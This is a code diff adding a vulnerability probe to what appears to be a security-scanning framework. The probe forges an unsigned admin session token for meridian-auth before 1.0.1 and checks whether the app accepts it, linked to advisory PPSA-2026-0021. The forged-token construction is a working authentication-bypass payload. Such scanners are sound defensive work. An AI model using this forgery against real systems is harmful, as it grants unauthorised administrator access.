@@ -22,6 +22,8 @@ so a deployment only runs the checks it has deliberately installed.
 """
 from __future__ import annotations
 
+import base64
+import json
 import threading
 import time
 from dataclasses import asdict, dataclass
@@ -90,6 +92,36 @@ def run(name: str, target: Target, wl: Workload, via: str) -> ProbeResult:
 
 def default_via(wl: Workload) -> str:
     return "public" if wl.internet_exposed else "internal"
+
+
+# ------------------------------------------------------------- installed checks
+
+def session_forge(target: Target, wl: Workload, via: str) -> ProbeResult:
+    """Forge an unsigned admin session and see whether the app honours it.
+
+    meridian-auth before 1.0.1 accepts a session token that carries no
+    signature, so a payload claiming role=admin is trusted as-is. The probe
+    mints such a token -- without the service secret -- and asks for the
+    account page: if the admin console comes back, the forgery worked.
+    """
+    def res(result: str, detail: str) -> ProbeResult:
+        return ProbeResult("session-forge", wl.id, via, result, detail)
+
+    claims = json.dumps({"user": "pp-probe", "role": "admin"}, separators=(",", ":")).encode()
+    forged = base64.urlsafe_b64encode(claims).decode().rstrip("=") + "."   # payload, empty signature
+    r = target.http(wl, "/account", {"Cookie": f"session={forged}"}, via=via)
+    if r.status == 200 and "admin console" in r.body.lower():
+        return res("VULNERABLE", "a forged, unsigned admin session was accepted: /account returned the admin console")
+    if r.status in (401, 403):
+        return res("SAFE", f"HTTP {r.status}: the unsigned session was rejected")
+    return res("SAFE", f"HTTP {r.status}: the forged session did not unlock the admin console")
+
+
+# The Meridian portal deployment installs the session-forgery check and attaches
+# it to the advisory (and its CVE alias, for advisories added without a hint).
+register("session-forge", session_forge)
+attach("PPSA-2026-0021", "session-forge")
+attach("CVE-2026-55021", "session-forge")
 
 
 def health(target: Target, wl: Workload, via: str, timeout: float) -> tuple[bool, str]:
